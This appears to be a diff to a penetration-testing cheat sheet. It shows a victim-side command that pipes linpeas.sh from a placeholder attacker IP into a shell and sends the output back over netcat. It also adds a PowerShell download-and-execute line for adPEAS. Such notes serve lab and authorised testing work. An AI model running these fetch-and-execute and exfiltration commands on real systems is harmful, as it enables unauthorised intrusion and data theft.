@@ -16,5 +16,8 @@ sudo systemctl start apache2
 nc -lvnp 9002 | tee linpeas.out
 curl <KALI_IP>/lin/linpeas.sh | sh | nc <KALI_IP> 9002 #Victim
 
-#read linpeas output with colors
+# read linpeas output with colors
 less -r linpeas.out
+
+# adPEAS
+IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/adPEAS.ps1"); Invoke-adPEAS
